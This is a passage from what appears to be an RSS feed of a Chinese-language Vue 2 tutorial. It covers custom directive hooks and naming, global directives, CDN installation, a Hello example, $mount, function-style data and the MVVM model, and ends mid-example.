<p>上例中的<code>v-fbind</code>必须使用配置对象写法的原因：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">fbind</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">element</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">binding</span><span class="p">.</span><span class="nx">value</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 代码正确但执行时机（指令与元素绑定时并不会放入页面）有误
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">element</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span> <span class="c1">// 不能在此调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p><code>v-fbind</code>使用函数式写法时，上方代码只能在<code>bind</code>和<code>update</code>时机调用，而<code>element.focus()</code>必须在<code>document.body.appendChild()</code>操作（插入到页面中）之后才能调用。演示代码如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;btn&#34;</span><span class="p">&gt;</span>创建输入框<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">btn</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;btn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="nx">btn</span><span class="p">.</span><span class="nx">onclick</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">input</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="s1">&#39;demo&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">input</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="mi">99</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* 可以在 append 之前使用的操作... */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">input</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">input</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nx">input</span><span class="p">.</span><span class="nx">parentElement</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">backgroundColor</span> <span class="o">=</span> <span class="s1">&#39;skyblue&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* 必须在 append 之后使用的操作... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Vue指令的<code>bind</code>仅仅只是将指令和虚拟DOM进行绑定，而虚拟DOM插入到页面中是在<code>inserted</code>之后。所以对<code>v-fbind</code>使用简写形式来定义，会导致在初次进入页面之时没有获取输入框的焦点。</p>
<h2 id="指令命名方式" data-numberify>指令命名方式<a class="anchor ms-1" href="#指令命名方式"></a></h2>
<p>由于Html对大小写不敏感（大写和小写等价）。所以在使用Vue指令时与编写Html一样，通常是使用小写（实际上，Vue获取到的指令名称也是小写形式）。所以遇到指令名称需要用多个单词来表示时，camelCase（驼峰式命名规则）显然不适用，通常是使用kebab-case（烤肉串式命名规则，使用<code>-</code>对名称进行分隔）。</p>
<p>例如，将<code>v-big</code>指令改为<code>v-times-ten</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Current Number: <span class="p">&lt;</span><span class="nt">span</span> <span class="na">v-text</span><span class="o">=</span><span class="s">&#34;num&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>10 Times Number: <span class="p">&lt;</span><span class="nt">span</span> <span class="na">v-times-ten</span><span class="o">=</span><span class="s">&#34;num&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;num++&#34;</span><span class="p">&gt;</span>Number+1<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">num</span><span class="o">:</span> <span class="mi">66</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">directives</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;times-ten&#39;</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The v-big was executed.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">element</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">binding</span><span class="p">.</span><span class="nx">value</span> <span class="o">*</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="全局自定义指令" data-numberify>全局自定义指令<a class="anchor ms-1" href="#全局自定义指令"></a></h2>
<p>全局自定义指令是指在Vue原型对象中，使用<code>Vue.directive()</code>方法来定义的指令。全局自定义指令也有两种与局部自定义指令相同的形式：</p>
<ul>
<li>
<p>对象配置写法：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">directive</span><span class="p">(</span><span class="s1">&#39;command&#39;</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 指令与元素成功绑定时（页面初始化时）调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">bind</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 指令所在元素被插入页面时调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">inserted</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 指令所在的模板被重新解析时调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">update</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div></li>
<li>
<p>函数式写法（简写形式）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">directive</span><span class="p">(</span><span class="s1">&#39;command&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 入门</title>
      <link>/docs/vue/introduction/</link>
      <pubDate>Sat, 19 Aug 2023 07:36:10 +0000</pubDate>
      
      <guid>/docs/vue/introduction/</guid>
      <description><![CDATA[Vue.js 是一套构建用户界面的渐进式框架。Vue 只关注视图层，采用自底向上增量开发的设计。Vue 的目标是通过尽可能简单的 API 实现响应的数据绑定和组合的]]></description>
      <content:encoded><![CDATA[<p>Vue.js 是一套构建用户界面的渐进式框架。Vue 只关注视图层，采用自底向上增量开发的设计。Vue 的目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。</p>
<p>在学习Vue之前需要了解HTML、CSS和JavaScript。</p>
<p>Vue的特点：</p>
<ul>
<li>
<p>采用组件化模式，提高代码复用率、且让代码更好维护。</p>
</li>
<li>
<p>采用声明式编码，让编码人员无需直接操作DOM，提高开发效率。</p>
<p>使用传统JS操作DOM属于命令式编码。</p>
</li>
<li>
<p>使用虚拟DOM和优秀的Diff算法，尽量复用DOM节点。</p>
</li>
</ul>
<p>Vue官网为：<a href="https://cn.vuejs.org/" target="_blank" rel="noopener noreferrer">https://cn.vuejs.org/<i class="fas fa-external-link-square-alt ms-1"></i></a>。</p>
<hr>
<h1 id="安装-vue" data-numberify>安装 Vue<a class="anchor ms-1" href="#安装-vue"></a></h1>
<p>安装Vue的方式有很多，可以在<a href="https://v2.cn.vuejs.org/v2/guide/installation.html" target="_blank" rel="noopener noreferrer">Vue2文档<i class="fas fa-external-link-square-alt ms-1"></i></a>中查阅。</p>
<p>其中最简单的方式就是通过<code>&lt;script&gt;</code>标签引入。通过<code>&lt;script&gt;</code>标签，可以直接使用Vue CDN引入：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>通常引入的Vue有两种版本：</p>
<ul>
<li>
<p>开发版本：包含完整的警告和调试模式。如上方引入的即为<code>vue@2.7.14</code>的开发版本。</p>
</li>
<li>
<p>生产版本：删除了警告。通常Vue开发版本的文件名为<code>vue.min.js</code>。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.min.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
</ul>
<p>在使用Vue时，通常会在浏览器中安装Vue的开发者工具插件：<a href="https://github.com/vuejs/devtools#vue-devtools" target="_blank" rel="noopener noreferrer">https://github.com/vuejs/devtools#vue-devtools<i class="fas fa-external-link-square-alt ms-1"></i></a>。</p>
<hr>
<h1 id="hello" data-numberify>Hello<a class="anchor ms-1" href="#hello"></a></h1>
<p>下方演示了Vue的基本使用方式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Hello Vue<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;root&#34;</span><span class="p">&gt;</span> <span class="c">&lt;!-- Vue 容器 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Hello, {{name}}<span class="c">&lt;!-- 插值表达式 --&gt;</span>!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">      阻止 vue 在启动时生成生产提示
</span></span></span><span class="line"><span class="cl"><span class="cm">      Vue 2.x 中可能不会生效，直接修改 Vue 源码
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 创建 Vue 实例
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">      <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#root&#39;</span><span class="p">,</span>  <span class="c1">// 将实例与容器进行绑定
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">data</span><span class="o">:</span> <span class="p">{</span> <span class="c1">// data 中用于存储数据，存储的数据供 el 所指定的容器使用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Vue.js&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Hello实例中的一些关键点：</p>
<ul>
<li>
<p>Vue 容器：</p>
<ul>
<li>
<p>容器中的代码依然符合 HTML 规范，只不过混入了一些特殊的 Vue 语法。</p>
</li>
<li>
<p>容器中的代码被称为 Vue模板。</p>
</li>
<li>
<p>插值语法：在HTML标签体中，使用两个花括号<code>{{ }}</code>将JS表达式引起来。与语句不同的是，表达式指可以生成值的语句，这个语句可以放在任何需要值的地方。</p>
<p>也就是说插值表达式一定需要有值（或返回值）。</p>
<p>插值表达式中的变量、方法都是在对应 Vue实例 的 <code>data</code> 中定义的。当<code>data</code>发生了改变，页面中对应的数据也会发生改变。</p>
<blockquote>
<p>插值是，Vue模板语法中的一种。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Vue 实例：Vue 实例用于解析 Vue 容器，Vue 实例会根据配置对象的信息去解析对应的模板。创建Vue 实例时需要传入一个配置对象。</p>
<ul>
<li>
<p><code>el</code>属性：将实例与容器进行绑定，<code>el</code> 的值通常为 CSS 选择器字符串。</p>
<p><code>el</code>属性中传入的值也可以是具体的Element对象，例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;root&#39;</span><span class="p">)</span> <span class="c1">// el 还可以这么绑定
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">})</span>
</span></span></code></pre></div></li>
<li>
<p><code>data</code>：<code>data</code> 中用于存储数据（对象或方法），存储的数据供 <code>el</code> 所指定的容器使用。<code>data</code> 可以是对象或函数。</p>
</li>
</ul>
<p>Vue实例和Vue容器是一对一关系。当一个实例的<code>el</code>配置有多个与之对应的容器时，Vue不会报错，但页面显示会有问题；当一个容器被多个实例指定时，Vue会报错。</p>
<p>真实开发中只有一个Vue实例，并且会配合着组件一起使用。</p>
</li>
</ul>
<hr>
<h1 id="创建-vue-实例的另一种方式" data-numberify>创建 Vue 实例的另一种方式<a class="anchor ms-1" href="#创建-vue-实例的另一种方式"></a></h1>
<p>在创建Vue实例时，可以不用立即指定<code>el</code>来绑定容器。</p>
<p>可以通过<code>vm.$mount()</code>来绑定容器：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Hello {{name}}!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">      <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Linner&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 使用 $mount() 绑定容器
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">vm</span><span class="p">.</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><blockquote>
<p><code>vm.$mount()</code>是Vue原型对象上的一个方法。</p>
</blockquote>
<hr>
<h1 id="数据对象的函数式写法" data-numberify>数据对象的函数式写法<a class="anchor ms-1" href="#数据对象的函数式写法"></a></h1>
<p>Vue实例中的<code>data</code>不仅可以作为对象去定义，还能作为函数去定义：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Hello {{name}}!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">      <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 函数式 data，将返回值作为数据对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">data</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">         * data() 的 this 是当前的Vue实例对象
</span></span></span><span class="line"><span class="cl"><span class="cm">         * 定义data()时不要使用箭头函数
</span></span></span><span class="line"><span class="cl"><span class="cm">         * 如果将data()定义为箭头函数，那么this就不再是当前Vue的实例对象了
</span></span></span><span class="line"><span class="cl"><span class="cm">         */</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Linner&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><hr>
<h1 id="mvvm-模型" data-numberify>MVVM 模型<a class="anchor ms-1" href="#mvvm-模型"></a></h1>
<p>Vue是在MVVM模型的基础上进行设计，MVVM模型包含以下3个部分：</p>
<ul>
<li><strong>M</strong>（Model）：模型，对应Vue实例<code>data</code>中的数据。</li>
<li><strong>V</strong>（View）：模板，即Vue容器。</li>
<li><strong>VM</strong>（View Model）：视图模型，对应Vue实例对象。</li>
</ul>
<p><picture><img class="img-fluid " alt="Vue 和 MVVM 模型" src="/docs/vue/introduction/uTools_1692692952621.png" loading="lazy" width="770" height="409" />
</picture>

</p>
<ul>
<li>DOM Listeners：DOM监听器，监听View中数据的改变，并根据Data Bindings指定的关系，将View中被修改的数据在Model中做相应的改变。</li>
<li>Data Bindings：数据绑定，将View与Model中对应的数据进行绑定，表示视图与模型间的一种对应关系。</li>
</ul>
<p>在代码中，Vue和MVVM模型的对应关系如下所示：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Hello Vue<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.min.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
